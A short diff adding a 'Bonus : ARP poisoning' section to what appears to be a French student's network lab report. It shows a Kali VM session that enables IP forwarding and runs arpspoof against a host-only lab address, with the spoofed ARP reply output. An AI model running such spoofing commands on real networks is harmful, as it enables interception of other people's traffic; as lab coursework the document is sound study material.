@@ -245,3 +245,15 @@ Ok.
 voir le document arp2
 
 3. Bonus : ARP poisoning
+Sur ma VM kali :
+```
+┌──(kilian㉿vmkali)-[~]
+└─$ sudo su -   
+
+┌──(root㉿vmkali)-[~]
+└─# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+┌──(root㉿vmkali)-[~]
+└─# arpspoof -i eth1 192.168.56.1
+8:0:27:fd:42:35 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:fd:42:35
+```
